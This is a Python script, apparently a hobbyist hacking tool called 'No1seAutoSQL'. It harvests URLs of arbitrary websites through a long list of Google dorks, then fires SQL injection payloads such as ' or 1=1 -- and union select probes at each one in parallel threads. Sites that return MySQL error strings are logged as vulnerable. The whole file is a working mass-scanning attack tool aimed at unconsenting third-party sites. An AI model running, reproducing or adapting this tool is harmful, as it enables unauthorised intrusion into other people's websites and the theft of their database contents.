import requests
import concurrent.futures
import re
import os
from colorama import init, Fore, Style
import sys
import time
import multiprocessing
import platform
from tqdm import tqdm
        #Coded And Made By no1se
init(autoreset=True)

#detecting clear
if platform.system() == 'Windows':
    clear_command = 'cls'
else:
    clear_command = 'clear'
#detecting clear



def step1():
    dorks = [
    "allinurl:trainers.php?id=",
    "allinurl:buy.php?category=",
    "allinurl:article.php?ID=",
    "allinurl:index.php?id=",
    "allinurl:trainers.php?id=",
    "allinurl:buy.php?category=",
    "allinurl:article.php?ID=",
    "allinurl:play_old.php?id=",
    "allinurl:newsitem.php?num=",
    "allinurl:readnews.php?id=",
    "allinurl:top10.php?cat=",
    "allinurl:historialeer.php?num=",
    "allinurl:reagir.php?num=",
    "allinurl:Stray-Questions-View.php?num=",
    "allinurl:forum_bds.php?num=",
    "allinurl:game.php?id=",
    "allinurl:view_product.php?id=",
    "allinurl:newsone.php?id=",
    "allinurl:sw_comment.php?id=",
    "allinurl:news.php?id=",
    "allinurl:avd_start.php?avd=",
    "allinurl:event.php?id=",
    "allinurl:product-item.php?id=",
    "allinurl:sql.php?id=",
    "allinurl:news_view.php?id=",
    "allinurl:select_biblio.php?id=",
    "allinurl:humor.php?id=",
    "allinurl:aboutbook.php?id=",
    "allinurl:ogl_inet.php?ogl_id=",
    "allinurl:fiche_spectacle.php?id=",
    "allinurl:communique_detail.php?id=",
    "allinurl:sem.php3?id=",
    "allinurl:kategorie.php4?id=",
    "allinurl:news.php?id=",
    "allinurl:index.php?id=",
    "allinurl:faq2.php?id=",
    "allinurl:show_an.php?id=",
    "allinurl:preview.php?id=",
    "allinurl:loadpsb.php?id=",
    "allinurl:opinions.php?id=",
    "allinurl:spr.php?id=",
    "allinurl:pages.php?id=",
    "allinurl:announce.php?id=",
    "allinurl:clanek.php4?id=",
    "allinurl:participant.php?id=",
    "allinurl:download.php?id=",
    "allinurl:main.php?id=",
    "allinurl:review.php?id=",
    "allinurl:chappies.php?id=",
    "allinurl:read.php?id=",
    "allinurl:prod_detail.php?id=",
    "allinurl:viewphoto.php?id=",
    "allinurl:article.php?id=",
    "allinurl:person.php?id=",
    "allinurl:productinfo.php?id=",
    "allinurl:showimg.php?id=",
    "allinurl:view.php?id=",
    "allinurl:website.php?id=",
    "allinurl:hosting_info.php?id=",
    "allinurl:gallery.php?id=",
    "allinurl:rub.php?idr=",
    "allinurl:view_faq.php?id=",
    "allinurl:artikel"
    "allinurl:detail.php?ID=",
    "allinurl:index.php?=",
    "allinurl:profile_view.php?id=",
    "allinurl:category.php?id=",
    "allinurl:publications.php?id=",
    "allinurl:fellows.php?id=",
    "allinurl:downloads_info.php?id=",
    "allinurl:prod_info.php?id=",
    "allinurl:shop.php?do=part&id=",
    "allinurl:productinfo.php?id=",
    "allinurl:collectionitem.php?id=",
    "allinurl:band_info.php?id=",
    "allinurl:product.php?id=",
    "allinurl:releases.php?id=",
    "allinurl:ray.php?id=",
    "allinurl:produit.php?id=",
    "allinurl:pop.php?id=",
    "allinurl:shopping.php?id=",
    "allinurl:productdetail.php?id=",
    "allinurl:post.php?id=",
    "allinurl:viewshowdetail.php?id=",
    "allinurl:clubpage.php?id=",
    "allinurl:memberInfo.php?id=",
    "allinurl:section.php?id=",
    "allinurl:theme.php?id=",
    "allinurl:page.php?id=",
    "allinurl:shredder-categories.php?id=",
    "allinurl:tradeCategory.php?id=",
    "allinurl:product_ranges_view.php?ID=",
    "allinurl:shop_category.php?id=",
    "allinurl:transcript.php?id=",
    "allinurl:channel_id=",
    "allinurl:item_id=",
    "allinurl:newsid=",
    "allinurl:trainers.php?id=",
    "allinurl:news-full.php?id=",
    "allinurl:news_display.php?getid=",
    "allinurl:index2.php?option=",
    "allinurl:readnews.php?id=",
    "allinurl:top10.php?cat=",
    "allinurl:newsone.php?id=",
    "allinurl:event.php?id=",
    "allinurl:product-item.php?id=",
    "allinurl:sql.php?id=",
    "allinurl:aboutbook.php?id=",
    "allinurl:preview.php?id=",
    "allinurl:loadpsb.php?id=",
    "allinurl:pages.php?id=",
    "allinurl:clanek.php4?id=",
    "allinurl:announce.php?id=",
    "allinurl:chappies.php?id=",
    "allinurl:read.php?id=",
    "allinurl:viewapp.php?id=",
    "allinurl:viewphoto.php?id=",
    "allinurl:rub.php?idr=",
    "allinurl:galeri_info.php?l=",
    "allinurl:review.php?id=",
    "allinurl:iniziativa.php?in=",
    "allinurl:curriculum.php?id=",
    "allinurl:labels.php?id=",
    "allinurl:story.php?id=",
    "allinurl:look.php?ID=",
    "allinurl:newsone.php?id=",
    "allinurl:aboutbook.php?id="
    ]
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
    }
    urls = []
    for dork in tqdm(dorks, desc="Searching Google..."):
        url = f'https://www.google.com/search?q={dork}'
        response = requests.get(url, headers=headers)
        dork_urls = re.findall(r'<a href="(https?://\S+)"', response.text)
        urls.extend(dork_urls)

    with tqdm(total=len(urls), desc="Writing URLs to file") as pbar:
        with open('googledork.txt', 'w') as f:
            for url in urls:
                f.write(url + '\n')
                pbar.update(1)
#######################################################################################################
def sqlscan():
    urls = []
    sqli_payloads = [
        "'",
        "\"",
        "--",
        ";",
        "/*",
        "*/",
        "' or 1=1 --",
        "\" or 1=1 --",
        "' union select 1,2,3 --",
        "\" union select 1,2,3 --",
        "' and 1=0 union select 1,2,3 --",
        "\" and 1=0 union select 1,2,3 --",
    ]

    def sql(url):
        url = url.strip()
        for payload in sqli_payloads:
            check_sql(url, payload)

    def check_sql(url, payload):
        sqli_url = url + payload

        try:
            with requests.Session() as session:
                response = session.get(sqli_url)
                if "sql syntax" in response.text.lower() or "mysql_fetch" in response.text.lower() or "mysql_num_rows" in response.text.lower():
                    with open("work.txt", "a") as f:
                        f.write(f"{url} {payload}\n")
                    print(f"{Fore.GREEN}Found one! {Fore.LIGHTYELLOW_EX}{url} {payload}")
                else:
                    print(f"{Fore.RED}Not found! {Fore.LIGHTYELLOW_EX}{url} {payload}")
        except Exception as e:
            print(f"{Fore.BLACK}Request failed for {url} {payload}: {e}")

    with open("googledork.txt", "r") as f:
        urls = f.read().splitlines()

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(sql, urls)


def main_menu():
    os.system(clear_command)
    #Squidward
    print("        .--'''''''''--.")
    print("     .'      .---.      '.")
    print("    /    .-----------.    \'")
    print("   /        .-----.        \'")
    print("   |       .-.   .-.       |")
    print("   |      /   \ /   \      |")
    print("    \    | .-. | .-. |    /")
    print("     '-._| | | | | | |_.-'")
    print("         | '-' | '-' |")
    print("          \___/ \___/")
    print("       _.-'  /   \  `-._")
    print("     .' _.--|     |--._ '.")
    print("     ' _...-|     |-..._ '")
    print("            |     |")
    print("            '.___.'")
#Squidward
    print(Fore.RED+"Welcome to No1seAutoSQL")
    print(Fore.LIGHTYELLOW_EX+"Please select an option:")
    print(f"{Fore.WHITE}1. Scan the web for SQL injection{Style.RESET_ALL}")
    print(f"{Fore.WHITE}2. Scan for SQL injection using an existing googledork.txt after selecting option one.{Style.RESET_ALL}")
    print(f"{Fore.LIGHTYELLOW_EX}3. Exit{Style.RESET_ALL}")
    selection = input(Fore.RED+"Select an option: "+Fore.WHITE)
    return selection


while True:
    selection = main_menu()
    if selection == "1":
        os.system(clear_command)
        print(Fore.GREEN+"Starting the first Step. Please be patient it will take some time. Don't stop the script!")
        step1()
        os.system(clear_command)
        print(Fore.GREEN+"Step one has been completed, and we have gathered the dorks.")
        time.sleep(3)
        print(Fore.RED+"Starting the scan in 10 seconds, please don't do anything in the middle of the scan!")
        time.sleep(10)
        os.system(clear_command)
        sqlscan()
        os.system(clear_command)
        print(Fore.GREEN+"Results are done and saved to work.txt. Made by no1se.")
        cleartxt = "googledorks.txt"
        os.remove(cleartxt)
        exit()
        
    elif selection == "2":
        os.system(clear_command)
        sqlscan()
    elif selection == "3":
        print(Fore.BLACK+"Exiting...")
        sys.exit(0)
    else:
        print(Fore.RED + "Invalid option. Please try again.")
        time.sleep(3)


        #Coded And Made By no1se